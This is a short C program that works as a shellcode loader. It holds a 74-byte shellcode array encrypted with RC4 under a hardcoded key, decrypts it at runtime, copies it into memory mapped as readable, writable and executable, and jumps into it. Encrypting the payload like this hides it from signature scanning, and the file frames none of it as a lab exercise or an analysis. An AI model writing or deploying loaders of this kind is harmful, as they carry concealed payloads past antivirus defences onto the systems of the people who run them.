#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char encrypted_shellcode[] = {
    0xc3, 0x05, 0xd3, 0x38, 0xc8, 0xef, 0x85, 0x16, 0x02, 0xc5, 0xc2,
    0x14, 0x46, 0x73, 0xd5, 0xe3, 0x6b, 0x6b, 0x7b, 0xcc, 0x0f, 0xbd,
    0x76, 0xdd, 0x52, 0xde, 0xda, 0xf7, 0xbf, 0x4a, 0xcd, 0x57, 0xee,
    0xfb, 0x82, 0xed, 0x3e, 0x87, 0xd6, 0x97, 0xcf, 0x55, 0xb7, 0xee,
    0x25, 0x2a, 0xb8, 0x42, 0xac, 0xa3, 0xf1, 0x0a, 0xdb, 0xc8, 0x10,
    0xdc, 0xe1, 0x2a, 0x1d, 0x54, 0x40, 0x44, 0xf4, 0xa3, 0x56, 0xa4,
    0xe0, 0x69, 0x06, 0x89, 0xc1, 0x84, 0xbc, 0x1f};

void rc4_crypt(const unsigned char *key, size_t key_len,
               const unsigned char *input, unsigned char *output,
               size_t data_len) {
  if (key_len < 5 || key_len > 256) {
    printf("Error: Key length must be between 5 and 256 bytes.\n");
    return;
  }

  unsigned char s[256];
  int i, j = 0;

  for (i = 0; i < 256; i++) {
    s[i] = i;
  }

  for (i = 0; i < 256; i++) {
    j = (j + s[i] + key[i % key_len]) % 256;
    unsigned char tmp = s[i];
    s[i] = s[j];
    s[j] = tmp;
  }

  i = j = 0;
  for (size_t n = 0; n < data_len; n++) {
    i = (i + 1) % 256;
    j = (j + s[i]) % 256;
    unsigned char tmp = s[i];
    s[i] = s[j];
    s[j] = tmp;
    unsigned char k = s[(s[i] + s[j]) % 256];
    output[n] = input[n] ^ k;
  }
}

void execute_shellcode(unsigned char *shellcode, size_t len) {
  // Allocate RWX mem
  void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (mem == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  memcpy(mem, shellcode, len);

  // Cast to function pointer and call
  ((void (*)())mem)();
}

int main() {
  unsigned char key[] = "SecretKey1337";
  size_t key_len = strlen((char *)key);

  unsigned char decrypted[1024];
  size_t shellcode_len = sizeof(encrypted_shellcode);

  rc4_crypt(key, key_len, encrypted_shellcode, decrypted, shellcode_len);

  printf("Executing decrypted shellcode...\n");
  execute_shellcode(decrypted, shellcode_len);

  return 0;
}
